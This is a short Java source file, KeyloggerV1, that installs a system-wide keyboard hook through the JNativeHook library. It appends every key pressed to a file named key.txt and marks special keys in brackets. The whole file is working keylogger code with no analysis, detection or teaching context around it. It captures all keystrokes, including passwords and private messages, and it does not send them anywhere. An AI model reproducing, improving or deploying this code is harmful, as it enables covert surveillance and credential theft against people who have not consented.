package keyloggerv1;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author joseph
 */
public class KeyloggerV1 implements NativeKeyListener {

    private static final Path file = Paths.get("key.txt");

    public static void main(String[] args) {

        try {
            GlobalScreen.registerNativeHook();

        } catch (NativeHookException e) {
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new KeyloggerV1());

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        String KeyText = NativeKeyEvent.getKeyText(nke.getKeyCode());

        try ( OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND);  PrintWriter white = new PrintWriter(os)) {
            if (KeyText.length() > 1) {
                white.print("[" + KeyText + "]");
            } else {
                white.print(KeyText);
            }

        } catch (IOException ex) {
            System.exit(-1);
        }

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {

    }

}
